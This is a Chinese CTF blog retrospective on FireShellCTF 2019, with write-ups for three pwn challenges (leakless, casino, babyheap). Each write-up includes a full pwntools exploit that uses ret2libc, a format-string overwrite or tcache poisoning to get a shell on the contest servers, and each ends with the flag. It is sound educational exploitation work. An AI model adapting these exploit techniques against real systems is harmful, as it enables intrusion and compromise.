---
title: FireShellCTF2019反思
author: nepire
avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 12:26:45
tags:
keywords:
description:
photos:
---
实在是不应该，赛后看了下Pwn最后一题的EXP反省了下，要是能专注去分析还是能搓出来的，结果到后面也只做出来了常规的三题，不是一个很好的阶段结束，写完这篇总结就去肝19WF的参展品了，比赛估计也要停一段时间打不了。






### leakless
```bash
➜  leakless checksec leakless
[*] '/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/leakless/leakless'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
很基础的32位ret2libc
构造ROP来puts出puts_addr，题目没给libc，但[libc-search](https://libc.blukat.me/)搜得到libc,通过puts_sym来计算出libc_base，然后再计算出system和`/bin/sh`的地址,最后构造ROP链执行`system('/bin/sh')`getshell

#### EXP
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='i386',log_level='debug')
# n = process('./leakless')
n = remote('35.243.188.20',2002)
elf = ELF('./leakless')
libc = ELF('./libc.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_ret = 0x080483ad
feedme = 0x080485cb

payload = 'a'*0x48+'aaaa'+p32(puts_plt)+p32(pop_ret)+p32(puts_got)+p32(feedme)
# n.recv()
n.sendline(payload)

libc_base = u32(n.recv(4))-libc.sym['puts']
print "libc_base:",hex(libc_base)

payload = 'a'*0x4c + p32(libc_base + libc.sym['system'])+'aaaa'+p32(libc_base+libc.search('/bin/sh').next())
n.sendline(payload)

n.interactive()
```
#### FLAG
`F#{y3ah!!_y0u_d1d_1t!_C0ngr4tz}`

### casino
```bash
➜  casino checksec casino
[*] '/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/casino/casino'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
开始输入name的时候有一个`0x10`byte的格式化字符串，然后接着是100次伪随机数的判定，一开始没细看直接搓了100次判定成功的payload，发现拿不到flag，后来仔细看了下要求是`成功的次数大于100次`，正常来说是不可能的，但它判定成功后`累加的是一个全局变量bet`而不是`count++`或`count+=1`，也就是说，我们如果把bet改成大于1的值就可以让最终判断成功次数时大于100,而前面的16byte格式化字符串就足够用来修改任意地址的1byte，虽然因为`8byte补齐`和`\x00截断`的问题坑了好久，但最后还是搓出来一个还行的payload

#### EXP
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
from ctypes import *
context(os='linux',arch='amd64',log_level='debug')
# n = process('./casino')
n = remote('35.243.188.20',2001)
elf = ELF('./casino')
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

bet = 0x03
fmt_offset = 10
seed = libc.time(0)/0xa
print "seed:",hex(seed)
seed += bet
libc.srand(seed)
idx = 1
n.recvuntil('?')
payload = 'aaa%11$n'+p32(0x602020).ljust(8,'\x00')
n.sendline(payload)

for i in range(0,99):
    # n.recvuntil('number: ')
    num = libc.rand()
    sleep(0.08)
    n.sendline(str(num))
    s = "<%03d/100>"%idx
    log.success(s)
    idx += 1

n.interactive()
```
#### FLAG
`F#{buggy_c4s1n0_1s_n0t_f41r!}`

### babyheap
```bash
➜  babyheap checksec babyheap
[*] '/home/Ep3ius/CTF/pwn/process/2019-FireShellCTF/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
本来想说坑，可想想是自己没有先check一下libc版本的锅，只能说自己还不够成熟了（无奈）
```bash
➜  babyheap strings libc.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.26-0ubuntu2.1) stable release version 2.26, by Roland McGrath et al.
Compiled by GNU CC version 6.4.0 20171010.
	GNU Libidn by Simon Josefsson
```
libc版本是2.26，环境切到2.26下开始分析，很快就能就发现可能存在`UAF&double free`，还有一个choice为1337功能大致是malloc(0x60)然后写0x40byte的函数，我们可以想到用UAF劫持程序在一个可写的地方(!! bss段开始的地方有stdin和stdout不能覆盖，要加个偏移)malloc一个块然后通过`1337`函数来伪造bk指针为atoi_got来泄漏出libc，再通过`tcache_poisoning`把atoi_got改成system_addr后回到有用atoi的地方输入`/bin/sh`就能得到shell了。
#### EXP
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Distributed under terms of the MIT license.
# Author = nepire
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
# n = process('./babyheap')
n = remote("51.68.189.144", 31005)
elf = ELF('./babyheap')
libc = ELF('./libc.so.6') #2.26


def choice(idx):
    n.recvuntil('> ')
    n.sendline(str(idx))

def new():
    choice(1)

def edit(content):
    choice(2)
    n.recvuntil('Content? ')
    n.sendline(content)

def show():
    choice(3)

def free():
    choice(4)

def readn(content):
    choice(1337)
    n.recvuntil('Fill ')
    n.send(content)


bss = elf.bss()+0x20
log.success(hex(bss))
atoi_got = elf.got['atoi']
log.success(hex(atoi_got))

new()
free()
edit(p64(bss))
new()
# gdb.attach(n)
payload = p64(0)*5 + p64(atoi_got)
readn(payload)
show()
n.recvuntil('Content: ')
libc_base = u64(n.recv(6)+'\x00\x00')-libc.sym['atoi']
print "libc_base:",hex(libc_base)
system_addr = libc_base + libc.sym['system']
edit(p64(system_addr)) #atoi_got -> system_addr
choice('/bin/sh\x00')

n.interactive()
```
#### FLAG
`F#{W3lc0m3_t0_h34p_Expl01t4t10n!}`
